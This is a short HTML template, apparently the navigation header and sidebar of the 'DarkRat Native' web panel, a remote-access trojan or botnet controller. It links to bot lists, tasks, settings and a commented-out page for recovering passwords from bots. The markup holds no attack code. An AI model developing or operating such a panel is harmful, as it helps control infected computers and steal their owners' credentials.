<nav class="navbar navbar navbar-toggleable-sm navbar-inverse bg-inverse ">
  <a style="text-decoration: none;" class="navbar-brand" href="#">DarkRat Native</a>

  <ul class="nav navbar-nav navbar-right">
    <li><a href="/logout">  <img style="width:40px;" title="Logout" src="{$includeDir}assets/img/nav/logout.svg"> </a></li>
  </ul>
</nav>



<div class="row">
  <div class="col-md-12 col-lg-1">
      <div class="sidebar-nav">
          <ul>
              <li> <a href="/dashboard" title="Home">  <img src="{$includeDir}assets/img/nav/home.svg"> </a></li>
              <li> <a href="/tasks" title="Tasks">  <img src="{$includeDir}assets/img/nav/working-with-laptop.svg"> </a></li>
              <li> <a href="/bots" title="A list of all Bots">  <img src="{$includeDir}assets/img/nav/group.svg"> </a></li>
       <!--   <li> <a href="/passrecovery" title="Password Recovery from Bots"> <img src="{$includeDir}assets/img/pwd/show-password.svg"> </a></li> -->
              <li> <a href="/settings" title="Settings">  <img src="{$includeDir}assets/img/nav/settings.svg"> </a></li>

              {foreach from=$navRegistrations key=name item=navTab}
               <li> <a href="/{$name}" title="{$name}"> <img src="{$navTab}"> </a></li>
              {/foreach}
          </ul>
      </div>
  </div>